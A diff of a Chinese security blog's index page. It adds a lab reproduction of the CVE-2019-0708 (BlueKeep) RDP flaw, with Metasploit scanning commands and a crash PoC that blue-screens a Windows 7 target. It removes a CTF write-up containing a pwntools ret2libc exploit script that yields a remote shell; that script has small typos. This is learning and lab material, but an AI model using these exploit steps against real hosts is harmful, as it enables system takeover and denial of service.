@@ -197,7 +197,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/chrome/" style="font-size: 15px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 10px;">chrome_bug</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a>
+                        <a href="/tags/chrome/" style="font-size: 15px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 10px;">chrome_bug</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a>
                     </div>
                 </section>
                 
@@ -281,6 +281,101 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-CVE-2019-0708" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/13/CVE-2019-0708/" class="article-date">
+      <time datetime="2020-07-13T07:19:11.268Z" itemprop="datePublished">2020-07-13</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/13/CVE-2019-0708/">CVE-2019-0708</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。</p>
+<p>影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7</p>
+<h1 id="蓝屏"><a href="#蓝屏" class="headerlink" title="蓝屏"></a>蓝屏</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：kali IP：192.168.119.128</p>
+<p>靶机：win7 IP:192.168.119.139 (开放3389端口)</p>
+<p>工具：RDP漏洞扫描工具、MSF</p>
+<p>POC：<a href="https://github.com/n1xbyte/CVE-2019-0708" target="_blank" rel="noopener">https://github.com/n1xbyte/CVE-2019-0708</a></p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>nmap对win7端口扫描:</p>
+<p><img src="https://i.loli.net/2020/07/13/Agj1dU2GY5JKZnW.png" alt="nmap扫描3389.PNG"></p>
+<p>RDP工具在win7上扫描靶机:<code>0708detector.exe -t 192.168.119.139 -p 3389</code></p>
+<p><img src="https://i.loli.net/2020/07/13/CwHJ1PRnel7cyu5.png" alt="漏扫工具扫描3389（win7自身）.PNG"></p>
+<p>启动MSF<br>查找漏洞： <code>search 0708</code></p>
+<p>利用漏洞扫描模块： <code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code></p>
+<p>查看参数： <code>show options</code></p>
+<p>设置靶机IP： <code>set rhosts 192.168.119.139</code></p>
+<p>运行：<code>run</code></p>
+<h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>在kali中安装pip3,安装impacket库。下载poc。<br>切进目录CVE-2019-0708</p>
+<p>开始攻击： <code>python3 crashpoc.py 192.168.119.139 64(系统类型)</code></p>
+<p>攻击成功，win7变为蓝屏。</p>
+<p><img src="https://i.loli.net/2020/07/13/UN9urvOaMQxEDoC.png" alt="win7蓝屏.PNG"></p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h4 id="RDP协议"><a href="#RDP协议" class="headerlink" title="RDP协议"></a>RDP协议</h4><p>RDP,远程显示协议。传输方式：tcp/ip。提供了客户和服务器之间的连接。映像会话。<br>基本层次结构：</p>
+<ul>
+<li>网络连接层：RDP协议建立在tcp/ip协议之上，由于传输的数据量比较大，因此在协议的底层首先定义一层网络连接层，它定义了一个完整的RDP数据逻辑包，以避免由于网络包长度过长而被分割使数据丢失。</li>
+<li>ISO数据层：在网络连接层之上是ISO数据层，标识RDP数据的正常连接通信。</li>
+<li>虚拟通道层：在ISO数据层之上，RDP协议定义一个虚拟通道层，用以拆分标示不同虚拟通道的数据，加快客户端处理速度，节省占用网络接口的时间。</li>
+<li>加密解密层：在虚拟通道层之上，RDP定义一个数据加密解密层，此层用于对所有的功能数据进行加密解密处理。</li>
+<li>功能数据层：在加密解密层之上是功能数据，画面信息，本地资源转换，声音数据，打印数据等所有的功能数据信息都在此层进行处理。另外，根据数据类型的不同，这些数据都有各自不同层次的分割，</li>
+</ul>
+<p>连接过程说明：</p>
+<ul>
+<li>客户端连接服务器</li>
+<li>ISO数据层建立连接</li>
+<li>发送初始协议相关信息，接收加密、解密秘钥</li>
+<li>虚拟通道申请</li>
+<li>加密形式发送客户端系统信息，同时验证加密协议</li>
+<li>平台软件证书验证</li>
+<li>各功能建立连接，各功能数据传输，功能实现。</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows%E6%BC%8F%E6%B4%9E/" rel="tag">windows漏洞</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-攻防世界pwn-100" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -1197,92 +1292,10 @@
 
 
   
-    <article id="post-攻防世界-pwn-level3" class="article article-type-post" itemscope itemprop="blogPost">
   
-    <div class="article-meta">
-      <a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/" class="article-date">
-      <time datetime="2020-05-07T18:58:17.779Z" itemprop="datePublished">2020-05-08</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/">攻防世界 level3</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>这道题对于我来讲好难好难啊，涉及到了很多新的知识。<br>首先checksec</p>
-<p><img src="https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png" alt="17627983-3b321a2edea9a331.png"></p>
-<p>:可以直接栈溢出；基地址不变化；对数据有执行权限。</p>
-<p>查看main()函数：</p>
-<p><img src="https://i.loli.net/2020/05/08/eFk7XyEv6ZKtGxd.png" alt="17627983-fde84f52ba2311ab.png"></p>
-<p>查看函数function()：</p>
-<p><img src="https://i.loli.net/2020/05/08/doMwxehS3tCsbFq.png" alt="捕获.PNG"></p>
-<p>无system,无/bin/sh，给了一个共享文件libc_32.so.6,明显为ret2libc。</p>
-<blockquote>
-<p>ret2libc (return-into-libc)是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返回地址（EIP），使其返回到系统中的库函数，利用库函数中已有的功能来实施attack，而不是直接定位到注入的shellcode。system函数属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的。即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变，用工具来找到对应的libc文件。</p>
-</blockquote>
-<blockquote>
-<p>ret2libc特征：1、没有/bin/sh；2、没有system和/bin/sh；3、无system和/bin/sh，但是给了libc.so文件；4、这三个全都没有。</p>
-</blockquote>
-<blockquote>
-<p>ASLR：地址空间布局随机化，ios,android,windows,macos,linux的当前版本都具有ASLR保护。主要用于防止缓冲区溢出攻击，ASLR与虚拟内存管理一起工作，将程序的不同部分的位置随机化，令攻击者不能通过尝试和错误了解目标位置，因为地址将不同。</p>
-</blockquote>
-<p>read()函数中，buf大小为0x88，但是在函数中竟然规定了256之大。明显的栈溢出。</p>
-<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>libc内的地址是随机的，但是函数的相对地址是不变的，只要知道其中某一个函数的地址，再利用相对位移计算出我们所需要的函数的地址，如果知道read或write函数的地址就可以计算出其他函数的地址。</p>
-<p>某大佬攻击思路：</p>
-<p>（1）通过function()中的read构造栈溢出，并且覆写返回地址为plt中的write地址。（2）通过wirte泄露read在内存中的绝对地址，并且接着调用function()（注：got中的read保存着read在内存中的真实地址）（3）计算出system和/bin/sh的绝对地址，再通过function构造栈溢出进行覆写。（4）成功</p>
-<blockquote>
-<p>plt：procedure Linkage Table，延迟绑定，函数第一次用到时才进行绑定（符号查找，重定位等）；<br>实现手法：增加一层间接跳转。<br>调用函数时并不直接通过GOT跳转，而是通过一个叫做PLT的项的结构来进行跳转，每个外部函数在PLT中都有一个相应的项。<br>ELF将GOT拆分成两个表叫做.got和.got.plt。<br>.got用来保存全局变量引用的地址<br>.got.plt用来保存函数引用的地址，外部函数的引用全部放到 .plt.got中。</p>
-</blockquote>
-<p><strong>思路</strong> </p>
-<p>通过read覆盖返回地址没执行两次main函数，第一次泄露write函数的地址，第二次执行system函数。</p>
-<p>exp:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p&#x3D;remote(&#39;111.198.29.45&#39;,52277)</span><br><span class="line"> # p&#x3D;process(&quot;.&#x2F;level3&quot;)</span><br><span class="line"> # 获取文件对象</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;level3&#39;)</span><br><span class="line"> #获取lib库对象</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc_32.so.6&#39;)</span><br><span class="line"> #获取函数</span><br><span class="line">wirte_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">write_got&#x3D;elf.got[write&#39;]</span><br><span class="line">main_addr&#x3D;elf.sym[&#39;main&#39;]</span><br><span class="line"> #接受数据</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">  #char[88],ebp write函数地址，write函数返回地址（返回到main函数） write函数参数一（1）  write函数参数二（write_got的地址）write参数三（写4字节）</span><br><span class="line">payload&#x3D;0x88*&#39;a&#39;+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> #获取wirte在got中的地址</span><br><span class="line">write_got_addr&#x3D;u32(p.recv())</span><br><span class="line">print hex(write_got_addr)</span><br><span class="line"> # 计算lib库加载基址</span><br><span class="line">libc_base&#x3D;write_got_addr-libc.sym[&#39;write&#39;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line"> # 计算system的地址</span><br><span class="line">system_addr&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line">print hex(bin_sh_addr)</span><br><span class="line"> #计算字符串&#x2F;bin&#x2F;sh 的地址。0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep &quot;&#x2F;bin&#x2F;sh&quot;获取</span><br><span class="line">bin_sh_addr&#x3D;libc_base+0x15902b</span><br><span class="line">print hex(bin_sh_addr)</span><br><span class="line"> #char [88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)</span><br><span class="line">payload2&#x3D;0x88*&#39;a&#39;+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr)</span><br><span class="line"> #接受数据</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line"> #发送payloas</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"> #切换交互模式</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    </nav>
   
 </div>
       <footer id="footer">
